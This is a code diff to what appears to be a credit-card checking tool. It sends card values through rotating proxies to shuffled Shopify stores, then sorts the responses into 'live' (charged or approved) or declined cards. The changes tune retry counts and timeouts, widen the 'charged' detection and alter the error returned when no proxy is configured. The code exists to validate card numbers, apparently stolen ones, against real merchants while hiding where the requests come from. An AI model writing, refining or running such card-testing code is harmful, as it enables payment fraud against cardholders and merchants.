@@ -19,6 +19,7 @@ const buildApiUrl = (cc: string, site: string, proxy: string) =>
 const badResponses = [
   "Site not supported",
   "INVALID_PURCHASE_TYPE",
+  "INVALID_PURCHASE_TYPE",
   "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
   "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
   "Payment method not available",
@@ -166,14 +167,14 @@ type ApiCheckResult = {
   siteDead?: boolean;
 };
 
-const UNKNOWN_RETRY_ATTEMPTS = 4;
+const UNKNOWN_RETRY_ATTEMPTS = 1;
 const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
 
 const callApiOnce = async (cc: string, site: string, proxy: string): Promise<ApiCheckResult> => {
   const apiUrl = buildApiUrl(cc, site, proxy);
   
   const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 55000);
+  const timeoutId = setTimeout(() => controller.abort(), 22000);
   
   try {
     const response = await fetch(apiUrl, {
@@ -308,7 +309,7 @@ const callApiOnce = async (cc: string, site: string, proxy: string): Promise<Api
       if (isEmptyOrErrorOnly(lower)) {
         apiStatus = 'unknown';
       } else if (lower.includes('order_placed') || lower.includes('order placed') || lower.includes('order complete') || lower.includes('order_completed') ||
-          lower.includes('thank you') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
+          lower.includes('thank you') || lower.includes('charged":"true') || lower.includes('charged:true') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
         apiStatus = 'live';
       } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || 
                  lower.includes('insufficient') || lower.includes('otp_required') || lower.includes('otp required') ||
@@ -455,7 +456,7 @@ Deno.serve(async (req) => {
     }
 
     // Multi-site retry loop: try up to 3 different sites on site-level errors
-    const MAX_SITE_ATTEMPTS = Math.min(3, sites.length);
+    const MAX_SITE_ATTEMPTS = Math.min(2, sites.length);
     const shuffledSites = [...sites].sort(() => Math.random() - 0.5);
     const triedSiteUrls: string[] = [];
     const badSiteUrls: { url: string; reason: string }[] = [];
@@ -468,9 +469,13 @@ Deno.serve(async (req) => {
 
     if (proxyError || !userProxies || userProxies.length < 1) {
       return new Response(JSON.stringify({ 
-        error: 'You must add at least 1 proxy before using Shopify Charge.', 
-        computedStatus: 'unknown' 
-      }), { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
+        error: 'You must add at least 1 proxy before using Shopify Charge.',
+        computedStatus: 'unknown',
+        apiStatus: 'UNKNOWN',
+        apiMessage: 'You must add at least 1 proxy before using Shopify Charge.',
+        rawResponse: 'No user proxies configured',
+        allProxiesDead: true
+      }), { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
     }
 
     // Shuffle proxies for rotation
